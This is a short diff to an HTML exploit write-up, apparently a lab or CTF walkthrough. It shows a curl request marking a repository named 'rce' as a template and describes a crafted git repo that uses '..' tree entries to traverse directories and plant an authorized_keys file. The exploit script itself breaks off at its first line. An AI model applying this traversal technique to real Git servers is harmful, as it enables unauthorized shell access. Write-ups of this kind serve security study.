@@ -334,7 +334,7 @@ curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
   -d '{"template":true}'
 
 {"template": true, ...}
-<pre><code>
+</code></pre>
 
 <p>Created the malicious git repo, then found a script that'll allow for directory traversal — writes blob/tree/commit objects directly into <code>.git/objects/</code>, chains <code>..</code> tree entries around the <code>authorized_keys</code> blob, and manually points <code>refs/heads/main</code> at the crafted commit:</p>
 <pre><code>#!/usr/bin/env python3  
